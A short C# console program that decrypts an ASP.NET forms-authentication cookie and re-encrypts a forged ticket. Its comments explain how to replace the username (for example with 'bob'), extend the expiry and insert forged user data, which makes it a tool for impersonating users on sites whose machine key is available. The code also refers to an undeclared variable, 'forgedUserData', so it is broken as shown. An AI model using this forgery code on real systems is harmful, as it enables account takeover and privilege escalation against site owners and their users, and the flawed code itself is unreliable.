using System;
using System.Web.Security;

namespace FormsEncryptor
{
    class Program
    {
        static void Main(string[] args)
        {
       
            // Take an existing forms cookie 
            string encryptedTicket = "<ExistingEncryptedTicket>";
            string replacedUsername = "bob";

            FormsAuthenticationTicket unencryptedTicket = FormsAuthentication.Decrypt(encryptedTicket);
            FormsAuthenticationTicket ticket = new FormsAuthenticationTicket(1,
                   unencryptedTicket.Name, //comment out if you want to change the username
                 //  replacedUsername,  //uncomment if you want to change the username
                   DateTime.Now,
                   DateTime.Now.AddMinutes(120), // Add 120 minutes to expiry
                   unencryptedTicket.IsPersistent,
                   forgedUserData,
                   "/");

            string encTicket = FormsAuthentication.Encrypt(ticket);
            Console.WriteLine(encTicket);
            Console.Read();
        }
    }
}
